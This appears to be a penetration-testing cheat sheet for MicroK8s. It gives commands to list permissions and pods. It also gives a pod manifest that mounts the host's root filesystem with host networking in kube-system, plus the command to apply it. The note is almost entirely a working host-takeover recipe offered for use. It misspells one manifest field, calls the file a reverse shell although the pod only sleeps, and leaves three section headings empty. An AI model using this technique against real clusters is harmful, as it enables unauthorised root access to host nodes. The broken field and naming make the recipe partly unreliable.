
For [[Kubernetes]] information follow the link

Enumerate permissions
```bash
microk8s kubectl auth can-i --list
# If you see:
Resources   Non-Resource URLs   Resource Names   Verbs
*.*         []                  []               [*]
# You can do anything
```

Enumerate pods and namespaces, image name
```bash
microk8s kubectl get namespace
microk8s kubectl get pods
microk8s kubectl get pod $pod -o yaml # get the image: $field
```

Create a YAML file to create a pod to run as root - named kubeRevShell.yaml - [prettifer](https://onlineyamltools.com/prettify-yaml) 
```YAML
apiVersion: v1
kind: Pod
metadata:
  name: some-pod
  namespace: kube-system
spec:
  containers:
    - name: shell
      image: $imagenamegoeshere
      command: ['/bin/sh']
      args: ['-c', 'sleep 300000']
      volumeMounts:
        - mountPath: /mnt
          name: hostfs
  volumes:
    - name: hostfs
      hostPath:
        path: /
  autommountServiceAccountToken: true
  hostNetwork: true
```

Apply this configuration
```bash
microk8s kubectl apply -f kubeRevShell.yaml
```

Check the status of the pod
```bash
microk8s kubectl get pods -n kube-system # display kube-system namespace
```

Pod breakout

Privilege Escape

Cloud Hacking

## References

[Online YAML prettifier](https://onlineyamltools.com/prettify-yaml)